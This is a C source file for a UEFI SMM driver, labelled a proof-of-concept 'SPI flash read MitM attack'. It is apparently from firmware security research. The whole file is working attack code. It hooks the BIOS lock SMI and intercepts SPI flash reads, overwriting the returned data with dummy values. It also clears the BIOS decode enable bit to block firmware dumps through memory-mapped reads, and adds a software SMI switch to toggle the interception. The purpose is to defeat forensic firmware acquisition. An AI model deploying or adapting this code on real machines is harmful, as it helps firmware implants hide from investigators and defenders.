/** @file
  SPI flash read MitM attack PoC.

  Takahiro Haruyama (@cci_forensics)
 **/

#include <PiDxe.h>
#include <Library/SmmServicesTableLib.h>
#include <IndustryStandard/Q35MchIch9.h>
#include <Library/IoLib.h>
#include <Library/DebugLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <ScAccess.h>
#include <Protocol/Spi.h>
#include <Library/ScSpiCommonLib.h>
#include <Library/MmPciLib.h>
#include <Protocol/SmmIchnDispatchEx.h>
#include <Protocol/SmmPeriodicTimerDispatch2.h>
#include <Protocol/SmmSwDispatch2.h>
#include <Library/ScPlatformLib.h>

#define SW_SMI_SPI_MITM_SWITCH 0x77
STATIC UINT32 DUMMY = 0xbaadf00d;
//STATIC UINT32 DUMMY = 0xffffffff;

STATIC EFI_MM_CPU_IO_PROTOCOL *mMmCpuIo = NULL;
STATIC UINT16 mAcpiBaseAddr;

STATIC EFI_HANDLE mSmiHandlerDispatch = NULL;
STATIC EFI_SMM_SW_DISPATCH2_PROTOCOL *mSwDispatch = NULL;

STATIC EFI_SMM_ICHN_DISPATCH_EX_PROTOCOL *mIchnDispatch = NULL;
STATIC EFI_SMM_ICHN_DISPATCH_EX_CONTEXT mIchnExContextHw, mIchnExContextSw;
STATIC EFI_HANDLE mIchnHandleHw = NULL;
STATIC EFI_HANDLE mIchnHandleSw = NULL;

STATIC EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *mPeriodicTimerDispatch = NULL;
STATIC EFI_HANDLE mPeriodicTimerDispatchHandle = NULL; // for finer timer

/*
MdePkg/Include/Protocol/SmmPeriodicTimerDispatch2.h
typedef struct {
  ///
  /// The minimum period of time in 100 nanosecond units that the child gets called. The
  /// child will be called back after a time greater than the time Period.
  ///
  UINT64  Period;
  ///
  /// The period of time interval between SMIs. Children of this interface should use this
  /// field when registering for periodic timer intervals when a finer granularity periodic
  /// SMI is desired.
  ///
  UINT64  SmiTickInterval;
} EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT;
 */
// supported timers are defined in edk2-platforms//Silicon/BroxtonSoC/BroxtonSiPkg/SouthCluster/ScSmiDispatcher/Smm/ScSmmPeriodicTimer.c
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT mPeriodicTimerDispatch2RegCtx = { 80000000, 80000000 }; // 8s
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT mPeriodicTimerDispatch2RegCtxFiner = { 1000000, 640000 }; // 64ms
//EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT mPeriodicTimerDispatch2RegCtxFiner = { 100000, 15000 }; // 1.5ms

BOOLEAN isTimerFiner = FALSE;

extern VOID  CpuIceBreakpoint();

VOID
EnableSpiSmi (
    )
{
  //
  // Set the HSFC.FSMIE bit
  //
  //MmioOr16((UINTN)(SC_SPI_BASE_ADDRESS + R_SPI_HSFC), (UINT16)B_SPI_HSFC_FSMIE);
  MmioOr32((UINTN)(SC_SPI_BASE_ADDRESS + R_SPI_HSFS), B_SPI_HSFS_FSMIE);

  //
  // Set the SSFCS.SME bit
  //
  MmioOr32((UINTN)(SC_SPI_BASE_ADDRESS + R_SPI_SSFCS), B_SPI_SSFCS_SME);
}

VOID
DisableSpiSmi (
    )
{
  //
  // Clear the HSFC.FSMIE bit
  //
  MmioAnd32((UINTN)(SC_SPI_BASE_ADDRESS + R_SPI_HSFS), (UINT32)~B_SPI_HSFS_FSMIE);

  //
  // Clear the SSFCS.SME bit
  //
  MmioAnd32((UINTN)(SC_SPI_BASE_ADDRESS + R_SPI_SSFCS), (UINT32)~B_SPI_SSFCS_SME);      
}

VOID
OverwriteData (
    )
{
    UINT32 Index;
    
    //
    // overwrite the FDATA*
    //
    for (Index = 0; Index < 0x40; Index += sizeof (UINT32))
      MmioWrite32(SC_SPI_BASE_ADDRESS + R_SPI_FDATA00 + Index, DUMMY);
}

VOID
EFIAPI
SpiMitmCallbackHw (
  IN  EFI_HANDLE DispatchHandle,
  IN  EFI_SMM_ICHN_DISPATCH_EX_CONTEXT *DispatchContext
  )
{
  UINT32 SmiSts;
  UINT32 hsfs, faddr, fdbc, cycle;

  DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallbackHw called\n"));

  if (mAcpiBaseAddr) {
    hsfs = MmioRead32(SC_SPI_BASE_ADDRESS + R_SPI_HSFS);
    SmiSts = IoRead32(mAcpiBaseAddr + R_SMI_STS);
    
    //
    // Is this caused by a SPI controller?
    //
    if (((hsfs & B_SPI_HSFS_FDONE) != 0) && ((SmiSts & B_SMI_STS_SPI) != 0)) {
      faddr = MmioRead32(SC_SPI_BASE_ADDRESS + R_SPI_FADDR);
      fdbc = (hsfs & B_SPI_HSFS_FDBC_MASK) >> N_SPI_HSFS_FDBC;
      cycle = (hsfs & B_SPI_HSFS_CYCLE_MASK) >> N_SPI_HSFS_CYCLE;
      DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallbackHw: FADDR=0x%08x, FDBC=0x%x, FCYCLE=0x%x\n",
             faddr, fdbc, cycle));
      //CpuIceBreakpoint();

      if (cycle == V_SPI_HSFC_FCYCLE_READ)
        OverwriteData();

      DisableSpiSmi();
    }
  }  
}

VOID
EFIAPI
SpiMitmCallbackSw (
  IN  EFI_HANDLE DispatchHandle,
  IN  EFI_SMM_ICHN_DISPATCH_EX_CONTEXT *DispatchContext
  )
{
  UINT32 SmiSts;
  UINT32 ssfcs;

  DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallbackSw called\n"));

  if (mAcpiBaseAddr) {
    ssfcs = MmioRead32(SC_SPI_BASE_ADDRESS + R_SPI_SSFCS);
    SmiSts = IoRead32(mAcpiBaseAddr + R_SMI_STS);
    
    //
    // Is this caused by a SPI controller?
    //
    if (((ssfcs & B_SPI_SSFCS_CDS) != 0) && ((SmiSts & B_SMI_STS_SPI) != 0)) {  
    //if ((SmiSts & B_SMI_STS_SPI) != 0) {  
      //CpuIceBreakpoint();

      // actually I'm not sure where I should overwrite in sw sequencing. Is FDATA* correct?
      OverwriteData();
      
      DisableSpiSmi();
    }
  }  
}

VOID
ReassignSpiBase (
    )
{
  UINTN SpiPciBase;
  UINT32 SpiBar0;    
  
  //
  // Get the current SPIBAR
  //
  SpiPciBase = MmPciBase(DEFAULT_PCI_BUS_NUMBER_SC, PCI_DEVICE_NUMBER_SPI, PCI_FUNCTION_NUMBER_SPI);
  SpiBar0 = MmioRead32(SpiPciBase + R_SPI_BASE) & B_SPI_BASE_BAR;

  if (SpiBar0 != SC_SPI_BASE_ADDRESS) {
    DEBUG((EFI_D_INFO, "[SpiMitm] SpiBar0 = 0x%08x, SC_SPI_BASE_ADDRESS = 0x%08x\n",
           SpiBar0, SC_SPI_BASE_ADDRESS));

    MmioAnd8 (SpiPciBase + PCI_COMMAND_OFFSET, (UINT8) ~EFI_PCI_COMMAND_MEMORY_SPACE);
    MmioWrite32 (SpiPciBase + R_SPI_BASE, SC_SPI_BASE_ADDRESS);
    MmioOr8 (SpiPciBase + PCI_COMMAND_OFFSET, EFI_PCI_COMMAND_MEMORY_SPACE);    
  }
}

EFI_STATUS
EFIAPI
PeriodicTimerDispatch2Handler (
    IN EFI_HANDLE DispatchHandle,
    IN CONST VOID *Context,
    IN OUT VOID *CommBuffer,
    IN OUT UINTN *CommBufferSize
    )
{
  EFI_STATUS status;
  //UINT32 hsfs, cycle;
  //EFI_HANDLE PeriodicTimerDispatchHandle = NULL;
  //DEBUG((EFI_D_INFO, "[SpiMitm] PeriodicTimerDispatch2Handler called\n"));

  if (mSmiHandlerDispatch != NULL) {
    //
    // 1st time: unregister the root SMI handler
    //
    status = gSmst->SmiHandlerUnRegister(mSmiHandlerDispatch);
    ASSERT_EFI_ERROR(status);
    mSmiHandlerDispatch = NULL;
    DEBUG((EFI_D_INFO, "[SpiMitm] root SMI handler unregistered\n"));

    //
    // Reassign SPIBAR back
    //
    ReassignSpiBase();
  }
  else if (!isTimerFiner) {
    //
    // 2nd time: register a finer periodic timer SMI handler
    // A fine timer like 64ms looks to cause a loop? before an OS boot. 
    // So the finer timer will be registered after the boot.
    //
    status = mPeriodicTimerDispatch->Register(mPeriodicTimerDispatch, PeriodicTimerDispatch2Handler, 
                                              &mPeriodicTimerDispatch2RegCtxFiner,
                                              &mPeriodicTimerDispatchHandle);
    ASSERT_EFI_ERROR(status);
    DEBUG((EFI_D_INFO, "[SpiMitm] PeriodicTimerDispatch2Handler (finer) registered\n"));
    isTimerFiner = TRUE;
  }
  else {
    //
    // 3rd time and later: set the SMIE bit for MitM
    //
    EnableSpiSmi();
    
    //
    // overwrite FDATA* as long as the SPI command is read (hw sequencing only)
    //    
    //hsfs = MmioRead32(SC_SPI_BASE_ADDRESS + R_SPI_HSFS);
    //cycle = (hsfs & B_SPI_HSFS_CYCLE_MASK) >> N_SPI_HSFS_CYCLE;
    //if (cycle == V_SPI_HSFC_FCYCLE_READ)
    //OverwriteData();

    //
    // clear the BDE register value to prevent firmware dump through MMIO
    //
    status = PchBiosDecodeEnableSet(0);
    ASSERT_EFI_ERROR(status);
  }

  return EFI_SUCCESS;
}

VOID
EFIAPI
SpiMitmSwitchSwSmiHandler (
    IN  EFI_HANDLE DispatchHandle,
    IN  EFI_SMM_SW_REGISTER_CONTEXT *DispatchContext
    )
{
  EFI_STATUS                        status;

  /*if (mIchnDispatch) { 
    if (mIchnHandle != NULL) {
      status = mIchnDispatch->UnRegister(mIchnDispatch, mIchnHandle);
      ASSERT_EFI_ERROR(status);
      mIchnHandle = NULL;
      DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallback unregistered\n"));
    }
    else {
      mIchnExContext.Type = IchnExSpi;
      status = mIchnDispatch->Register(mIchnDispatch, SpiMitmCallback, &mIchnExContext, &mIchnHandle);
      ASSERT_EFI_ERROR(status);
      DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallback re-registered\n"));
    }
    }*/
  if (mPeriodicTimerDispatch) {
    if (mPeriodicTimerDispatchHandle != NULL) {
      status = mPeriodicTimerDispatch->UnRegister(mPeriodicTimerDispatch, mPeriodicTimerDispatchHandle);
      ASSERT_EFI_ERROR(status);
      mPeriodicTimerDispatchHandle = NULL;
      DEBUG((EFI_D_INFO, "[SpiMitm] PeriodicTimerDispatch2Handler (finer) unregistered\n")); 
    }
    else {
      status = mPeriodicTimerDispatch->Register(mPeriodicTimerDispatch, PeriodicTimerDispatch2Handler, 
                                                &mPeriodicTimerDispatch2RegCtxFiner,
                                                &mPeriodicTimerDispatchHandle);
      ASSERT_EFI_ERROR(status);
      DEBUG((EFI_D_INFO, "[SpiMitm] PeriodicTimerDispatch2Handler (finer) re-registered\n"));
      isTimerFiner = TRUE;
    }
  }
}

EFI_STATUS
EFIAPI
RootSmiHandler (
    IN EFI_HANDLE DispatchHandle,
    IN CONST VOID* RegisterContext,
    IN OUT VOID* CommBuffer,
    IN OUT UINTN* CommBufferSize
    )
{
  EFI_STATUS status;
  UINT8 commandNumber;
  //EFI_SMM_ICHN_DISPATCH_EX_CONTEXT IchnExContext;
  //EFI_HANDLE IchnHandle = NULL;
  EFI_HANDLE PeriodicTimerDispatchHandle = NULL;

  // copied from HelloSmm (https://github.com/tandasat/HelloSmm)
  //
  // Read the SMI command value from the power management port. This port can
  // be different on the other platforms, but this works on my target and all
  // Intel systems I have. You may fetch the AX register value to check this
  // using gEfiMmCpuProtocolGuid.
  //
  status = mMmCpuIo->Io.Read(mMmCpuIo, MM_IO_UINT8, ICH9_APM_CNT, 1, &commandNumber);
  ASSERT_EFI_ERROR(status);

  //DEBUG((EFI_D_INFO, "[SpiMitm] SMI 0x%02x\n", commandNumber));

  //
  // hook 0xA9 (SW_SMI_BIOS_LOCK) SW SMI during ScOnReadyToBoot()
  //
  if (commandNumber == 0xA9 && mIchnDispatch != NULL && mPeriodicTimerDispatch != NULL) { 
    //
    // Register an IchnExSpi(Hw|Sw) callback functions
    //
    mIchnExContextHw.Type = IchnExSpiHw;
    status = mIchnDispatch->Register(mIchnDispatch, SpiMitmCallbackHw, &mIchnExContextHw, &mIchnHandleHw);
    ASSERT_EFI_ERROR(status);
    mIchnExContextSw.Type = IchnExSpiSw;
    status = mIchnDispatch->Register(mIchnDispatch, SpiMitmCallbackSw, &mIchnExContextSw, &mIchnHandleSw);
    ASSERT_EFI_ERROR(status);
    DEBUG((EFI_D_INFO, "[SpiMitm] SpiMitmCallback registered\n"));

    //
    // Register a periodic timer SMI handler
    //
    status = mPeriodicTimerDispatch->Register(mPeriodicTimerDispatch, PeriodicTimerDispatch2Handler, 
                                              &mPeriodicTimerDispatch2RegCtx, &PeriodicTimerDispatchHandle);
    ASSERT_EFI_ERROR(status);
    DEBUG((EFI_D_INFO, "[SpiMitm] PeriodicTimerDispatch2Handler registered\n"));
  }

  //Exit:
  //
  // Allow other SMI to run.
  //
  return EFI_WARN_INTERRUPT_SOURCE_QUIESCED;
}

EFI_STATUS
EFIAPI
InstallSpiMitm (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable
    )
{
  EFI_STATUS status;
  EFI_HANDLE SwHandle = NULL;
  EFI_SMM_SW_REGISTER_CONTEXT SwContext;

  DEBUG((EFI_D_INFO, "[SpiMitm] InstallSpiMitm called\n"));

  //
  // Get the protocols
  //
  status = gSmst->SmmLocateProtocol(&gEfiMmCpuIoProtocolGuid, NULL, (VOID **)&mMmCpuIo);
  ASSERT_EFI_ERROR(status);    
  status = gSmst->SmmLocateProtocol(&gEfiSmmIchnDispatchExProtocolGuid, NULL, (VOID **)&mIchnDispatch);
  ASSERT_EFI_ERROR(status);
  status = gSmst->SmmLocateProtocol(&gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL,
                                    (VOID **)&mPeriodicTimerDispatch);
  ASSERT_EFI_ERROR(status);
  status = gSmst->SmmLocateProtocol(&gEfiSmmSwDispatch2ProtocolGuid, NULL, (VOID **)&mSwDispatch);
  ASSERT_EFI_ERROR(status);
    
  //
  // Get PMBASE
  //
  mAcpiBaseAddr = (UINT16) PcdGet16(PcdScAcpiIoPortBaseAddress);

  //
  // Register a root SMI handler to hook the BIOS lock event
  //
  status = gSmst->SmiHandlerRegister(RootSmiHandler, NULL, &mSmiHandlerDispatch);
  ASSERT_EFI_ERROR(status);
  
  //
  // Register a SPI MitM switch SW SMI handler
  //
  SwContext.SwSmiInputValue = SW_SMI_SPI_MITM_SWITCH;
  status = mSwDispatch->Register(mSwDispatch, (EFI_SMM_HANDLER_ENTRY_POINT2)SpiMitmSwitchSwSmiHandler,
                                 &SwContext, &SwHandle);
  ASSERT_EFI_ERROR (status);
  
  return status;
}
